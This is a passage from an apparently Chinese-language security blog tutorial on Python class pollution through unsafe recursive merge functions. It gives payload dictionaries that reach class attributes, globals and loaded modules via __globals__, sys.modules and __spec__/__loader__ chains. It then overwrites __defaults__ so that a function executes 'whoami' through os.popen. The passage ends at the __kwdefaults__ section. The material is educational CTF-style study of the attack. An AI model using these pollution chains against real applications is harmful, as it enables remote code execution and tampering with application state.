<h3 id="修改内置属性"><a href="#修改内置属性" class="headerlink" title="修改内置属性"></a>修改内置属性</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment"># &lt;slot wrapper &#x27;__str__&#x27; of &#x27;object&#x27; objects&gt;</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment"># shruti</span></span><br></pre></td></tr></table></figure></div>



<h3 id="无法污染的Object"><a href="#无法污染的Object" class="headerlink" title="无法污染的Object"></a>无法污染的<code>Object</code></h3><p>正如前面所述，并不是所有的类的属性都可以被污染，如<code>Object</code>的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment"># TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="更广泛的获取"><a href="#更广泛的获取" class="headerlink" title="更广泛的获取"></a>更广泛的获取</h3><p>在代码展示部分所给出的例子中，污染类属性是通过示例的<code>__base__</code>属性查找到其继承的父类，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力</p>
<h4 id="全局变量获取"><a href="#全局变量获取" class="headerlink" title="全局变量获取"></a>全局变量获取</h4><p>在<code>Python</code>中，函数或类方法（对于类的内置方法如<code>__init__</code>这些来说，内置方法在并未重写时其数据类型为装饰器即<code>wrapper_descriptor</code>，只有在重写后才是函数<code>function</code>）均具有一个<code>__globals__</code>属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的<code>globals</code>函数的返回值）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.__globals__ == <span class="built_in">globals</span>() == a.__init__.__globals__)</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure></div>



<p>所以我们可以使用<code>__globlasl__</code>来获取到全局变量，这样就可以修改无继承关系的类属性甚至全局变量</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">secret_var = <span class="string">&quot;koishi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret_var&quot;</span>: <span class="string">&quot;cirno&quot;</span>,</span><br><span class="line">            <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;secret_class_var&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment"># shruti</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment"># cirno</span></span><br></pre></td></tr></table></figure></div>



<h4 id="已加载模块获取"><a href="#已加载模块获取" class="headerlink" title="已加载模块获取"></a>已加载模块获取</h4><p>局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了</p>
<h5 id="加载关系简单"><a href="#加载关系简单" class="headerlink" title="加载关系简单"></a>加载关系简单</h5><p>在加载关系简单的情况下，我们可以直接从文件的<code>import</code>语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块。</p>
<p>我们可以通过当前文件中的类获取 globals 里的内容，import进来的模块也可以直接访问和修改。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;test&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span>: <span class="string">&quot;koishi&quot;</span>,</span><br><span class="line">                <span class="string">&quot;target_class&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.secret_var)</span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="built_in">print</span>(test.target_class.secret_class_var)</span><br><span class="line"><span class="comment"># ori_secret_class</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test.secret_var)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"><span class="built_in">print</span>(test.target_class.secret_class_var)</span><br><span class="line"><span class="comment"># shruti</span></span><br></pre></td></tr></table></figure></div>



<p><strong>test.py</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;ori_secret_class&quot;</span></span><br></pre></td></tr></table></figure></div>



<h5 id="加载关系复杂-示例"><a href="#加载关系复杂-示例" class="headerlink" title="加载关系复杂-示例"></a>加载关系复杂-示例</h5><p>如<code>CTF</code>题目等实际环境中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候通过直接看代码文件中<code>import</code>语法查找就十分困难，而解决方法则是利用<code>sys</code>模块</p>
<p><code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;test&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span>: <span class="string">&quot;koishi&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span>: <span class="string">&quot;shruti&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.secret_var)</span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"><span class="built_in">print</span>(test.target_class.secret_class_var)</span><br><span class="line"><span class="comment"># ori_secret_class</span></span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test.secret_var)</span><br><span class="line"><span class="comment"># koishi</span></span><br><span class="line"><span class="built_in">print</span>(test.target_class.secret_class_var)</span><br><span class="line"><span class="comment"># shruti</span></span><br></pre></td></tr></table></figure></div>

<p><strong>test.py</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;ori_secret_class&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>如上的<code>Payload</code>实际上是在已经<code>import sys</code>的情况下使用的，而大部分情况是没有直接导入的，这样问题就从<strong>寻找<code>import</code>特定模块的语句</strong>转换为<strong>寻找<code>import</code>了sys模块的语句</strong>，对问题解决的并不见得有多少优化。</p>
<h5 id="加载关系复杂-实际使用"><a href="#加载关系复杂-实际使用" class="headerlink" title="加载关系复杂-实际使用"></a>加载关系复杂-实际使用</h5><p>为了进一步优化，这里采用方式是利用<code>Python</code>中加载器<code>loader</code>，在官方文档中给出的定义是：</p>
<p><a href="https://img2023.cnblogs.com/blog/2293037/202301/2293037-20230127104647995-145728452.png"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127104647995-145728452.png"
                      alt="img"
                ></a></p>
<p>简单来说就是为实现模块加载而设计的类，其在<code>importlib</code>这一内置模块中有具体实现。令人庆幸的是<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.__init__&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap_external&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._common&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.abc&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.machinery&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.metadata&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.resources&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.util&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure></div>

<p>所以只要我们能过获取到一个<code>loader</code>便能用如<code>loader.__init__.__globals__[&#39;sys&#39;]</code>的方式拿到<code>sys</code>模块，这样进而获取目标模块。</p>
<p>那<code>loader</code>好获取吗？答案是肯定的。依据官方文档的说明，对于一个模块来说，模块中的一些内置属性会在被加载时自动填充：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127104705262-1430214027.png"
                      alt="img"
                ></p>
<p><code>__loader__</code>内置属性会被赋值为加载该模块的<code>loader</code>，这样只要能获取到任意的模块便能通过<code>__loader__</code>属性获取到<code>loader</code>，而且对于<code>python3</code>来说除了在<code>debug</code>模式下的主文件中<code>__loader__</code>为<code>None</code>以外，正常执行的情况每个模块的<code>__loader__</code>属性均有一个对应的类。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127104721104-1224559985.png"
                      alt="img"
                ></p>
<p><code>__spec__</code>内置属性在<code>Python 3.4</code>版本引入，其包含了关于类加载时的信息，本身是定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，显然因为定义在<code>importlib</code>模块下的<code>py</code>文件，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p>
<p>由于<code>ModuleSpec</code>的属性值设置，相对于上面的获取方式，还有一种相对长的<code>payload</code>的获取方式，主要是利用<code>ModuleSpec</code>中的<code>loader</code>属性。如属性名所示，该属性的值是模块加载时所用的<code>loader</code>，在源码中如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127104734758-865825998.png"
                      alt="img"
                ></p>
<p>所以有这样的相对长的<code>Payload</code>：<code>&lt;模块名&gt;.__spec__.loader.__init__.__globals__[&#39;sys&#39;]</code></p>
<h3 id="实际环境中的合并函数"><a href="#实际环境中的合并函数" class="headerlink" title="实际环境中的合并函数"></a>实际环境中的合并函数</h3><p>目前发现了<code>Pydash</code>模块中的<code>set_</code>和<code>set_with</code>函数具有如上实例中<code>merge</code>函数类似的类属性赋值逻辑，能够实现污染攻击。<code>idekctf 2022*</code>中的<code>task manager</code>这题就设计使用该函数提供可以污染的环境</p>
<h2 id="攻击面扩展"><a href="#攻击面扩展" class="headerlink" title="攻击面扩展"></a>攻击面扩展</h2><h3 id="替换函数形参默认值"><a href="#替换函数形参默认值" class="headerlink" title="替换函数形参默认值"></a>替换函数形参默认值</h3><p>主要用到了函数的<code>__defaults__</code>和<code>__kwdefaults__</code>这两个内置属性</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/2293037-20230127104748903-1502385594.png"
                      alt="img"
                ></p>
<h4 id="defaults"><a href="#defaults" class="headerlink" title="__defaults__"></a><code>__defaults__</code></h4><p><code>__defaults__</code>以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的<strong>一类</strong>形参（也就是要么是位置参数，要么是关键字参数），<strong>并不是位置形参+键值形参</strong>（由于位置参数必须在关键字参数的前面，又由于是从左向右读取的，所以<strong>只要有一个位置参数有默认值，那么只会获取到位置参数的默认值</strong>），关于函数的参数分类可以参考学习过后记录的这篇文章：</p>
<p><a class="link"   href="file://python函数的位置参数(Positional)和关键字参数(keyword).md" >python函数的位置参数(Positional)和关键字参数(keyword) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>从代码上来看，则是如下的效果：</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2=<span class="number">2</span>, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2=<span class="number">2</span>, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2=<span class="number">2</span>, *, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2=<span class="number">2</span>, *, var_3=<span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__defaults__)</span><br><span class="line"><span class="comment"># (2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__defaults__)</span><br><span class="line"><span class="comment"># (2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__defaults__)</span><br><span class="line"><span class="comment"># (2,)</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__defaults__)</span><br><span class="line"><span class="comment"># (2,)</span></span><br></pre></td></tr></table></figure></div>

<p>通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如<code>JSON</code>等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evil_func</span>(<span class="params">arg_1, shell=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;evil_func&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span>: (</span><br><span class="line">                    <span class="literal">True</span>,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evil_func(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evil_func(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment"># laptop-hgndqc28\koishi</span></span><br></pre></td></tr></table></figure></div>

<p>注意这里 <code>__defaults__</code> 设置的值后还有个，不然无法转化为元组数据类型。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;__defaults__&quot;: (</span><br><span class="line">                    True,</span><br><span class="line">                )</span><br></pre></td></tr></table></figure></div>





<h4 id="kwdefaults"><a href="#kwdefaults" class="headerlink" title="__kwdefaults__"></a><code>__kwdefaults__</code></h4><p><code>__kwdefaults__</code>以字典的形式按从左到右的顺序收录了函数<strong>键值形参（关键字形参）</strong>的默认值，从代码上来看，则是如下的效果：</p>
